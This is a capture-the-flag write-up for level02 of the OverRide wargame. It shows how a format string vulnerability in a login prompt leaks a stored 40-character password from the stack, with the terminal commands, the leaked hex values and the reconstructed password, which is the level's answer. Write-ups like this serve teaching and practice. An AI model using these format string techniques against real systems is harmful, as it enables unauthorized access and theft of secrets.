We get the binary out of the Vm using this cmd:

`scp -P 4242 level2@192.168.56.103:./level2 .binary/level2`

We can see line 44 in the source.c we can use a format string attack so let's find where on the stack our password id :
```
level02@OverRide:~$ ./level02 
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: %c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,%c,
	--[ Password: *****************************************
	�,,%,*,*,�,%,,,c,,,,,,,,,,,,H,Q,X,s,M,,%,,,c,%,,,c, does not have access!
```
We can find some char starting at pos 22, and we know the password is 40 char long

```
level02@OverRide:~$ ./level02
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: %22$p
	--[ Password: 
	*****************************************
	0x756e505234376848 does not have access!
```
We can find the first 8 char from this so let's get the 32 next !

```
level02@OverRide:~$ ./level02 
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: %22$p %23$p %24$p %25$p %26$p
	--[ Password: 
	*****************************************
	0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```
Now we convert 
* 0x756e505234376848 => unPR47hH
* 0x45414a3561733951 => EAJ5as9Q
* 0x377a7143574e6758 => 7zqCWNgX
* 0x354a35686e475873 => 5J5hnGXs
* 0x48336750664b394d => H3gPfK9M

We just need to reverse them now and we get
`Hh74RPnu` `Q9sa5JAE` `XgNWCqz7` `sXGnh5J5` `M9KfPg3H`
`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
